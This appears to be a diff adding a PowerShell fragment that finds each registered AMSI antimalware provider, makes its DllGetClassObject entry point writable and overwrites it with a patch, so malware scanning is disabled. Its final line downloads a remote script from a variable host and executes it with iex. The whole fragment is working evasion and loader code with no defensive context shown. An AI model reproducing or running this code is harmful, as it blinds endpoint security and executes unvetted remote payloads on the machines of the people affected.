@@ -1,0 +1,19 @@
+foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+{
+    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
+    $dllPath = Get-ItemPropertyValue -Name '(Default)' $registry -ErrorAction SilentlyContinue
+    if ($dllPath)
+    {
+        $providerDLL = Split-Path $dllPath -leaf
+        $dll = $providerDLL -replace '"', ""
+        $hDLL = $LoadLibrary.Invoke($dll) 
+        if ($hdll -ne 0)
+        {
+            Write-host "[*] Provider found - " $providerDLL
+            $Address = $GetProcAddress.Invoke($hDLL, "DllGetClassObject")        
+            $VirtualProtect.Invoke($Address, [uint32]$Patch.Length, 0x40, [ref]$p)
+            [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+        }
+    }
+}
+$wbc.DownloadString("$prefixpath/Grilled.ps1.c5") | iex
